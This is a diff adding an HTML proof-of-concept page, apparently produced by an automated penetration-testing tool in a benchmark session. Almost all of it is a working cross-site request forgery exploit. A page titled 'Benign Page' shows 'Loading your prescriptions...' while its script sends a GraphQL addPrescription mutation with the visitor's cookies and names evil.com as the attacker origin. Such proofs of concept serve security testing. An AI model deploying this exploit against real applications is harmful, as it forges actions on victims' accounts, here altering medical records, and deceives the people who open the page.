@@ -1,0 +1,62 @@
+<!-- 
+POC: HTML-based CSRF attack that exploits missing CSRF protection on GraphQL mutations. When a logged-in user visits this page, it will attempt to execute an addPrescription mutation without CSRF token validation.
+Target: ./repo
+Created: 2025-11-10T19:42:51.118Z
+Session: benchmark-XBEN-007-24-mhtjlewb
+
+To test this POC:
+1. Open this file in a web browser: file:///home/daytona/.pensar/executions/benchmark-XBEN-007-24-mhtjlewb/pocs/poc_csrf_graphql_mutation.html
+2. Or serve it and navigate to the target application
+3. Observe the vulnerability demonstration (e.g., XSS alert, CSRF execution)
+-->
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Benign Page</title>
+</head>
+<body>
+    <h1>Loading your prescriptions...</h1>
+    <script>
+        // CSRF Attack: GraphQL Mutation without CSRF Token
+        // This script will execute when a logged-in user visits this page
+        // It will attempt to add a prescription to their account
+        
+        const targetUrl = 'http://localhost:5003/graphql';
+        const graphqlMutation = {
+            query: `mutation {
+                addPrescription(userId: 1, prescriptionDetails: "CSRF_INJECTED_PRESCRIPTION") {
+                    prescription {
+                        id
+                        userId
+                        prescriptionDetails
+                    }
+                }
+            }`
+        };
+        
+        // Send mutation from attacker's origin (http://evil.com)
+        fetch(targetUrl, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+                'Origin': 'http://evil.com'
+            },
+            body: JSON.stringify(graphqlMutation),
+            credentials: 'include'  // Include cookies from target domain
+        })
+        .then(response => {
+            console.log('Response status:', response.status);
+            return response.json();
+        })
+        .then(data => {
+            console.log('Mutation result:', JSON.stringify(data, null, 2));
+            document.body.innerHTML += '<p>Attack executed. Check console for details.</p>';
+        })
+        .catch(error => {
+            console.error('Error:', error);
+            document.body.innerHTML += '<p>Error occurred. Check console.</p>';
+        });
+    </script>
+</body>
+</html>
